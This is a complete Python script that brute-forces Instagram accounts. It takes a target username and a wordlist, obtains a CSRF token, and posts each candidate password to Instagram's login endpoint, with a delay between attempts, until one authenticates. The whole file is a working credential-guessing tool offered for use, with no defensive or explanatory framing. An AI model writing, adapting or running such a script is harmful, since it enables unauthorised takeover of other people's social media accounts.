import requests
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def login_instagram(username, password_list):
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    try:
        # Initial request to get CSRF token
        response = session.get('https://www.instagram.com/')
        response.raise_for_status()  # Raise exception for 4XX or 5XX status codes
        csrf_token = response.cookies.get('csrftoken', '')

        with open(password_list, 'r') as file:
            passwords = file.readlines()
            passwords = [password.strip() for password in passwords]

        for password in passwords:
            # Prepare login data
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            headers = {
                'X-CSRFToken': csrf_token,
                'referer': 'https://www.instagram.com/accounts/login/'
            }

            # Send login request
            response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
            response.raise_for_status()  # Raise exception for 4XX or 5XX status codes
            response_data = response.json()

            # Check login response
            if response_data.get('authenticated') and response_data['authenticated'] is True:
                print(f"Password '{password}' is correct.")
                break
            elif response_data.get('message'):
                print(f"Attempt with password '{password}' failed: {response_data['message']}")
            else:
                print(f"Attempt with password '{password}' failed.")

            # Introduce a delay between login attempts
            time.sleep(2)
    
    except FileNotFoundError:
        print(f"File '{password_list}' not found.")
    except requests.exceptions.HTTPError as e:
        print(f"HTTP error occurred: {e}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
    finally:
        session.close()

if __name__ == "__main__":
    username = input("Enter Instagram username: ")
    password_list = input("Enter the path to the wordlist file: ")
    
    login_instagram(username, password_list)
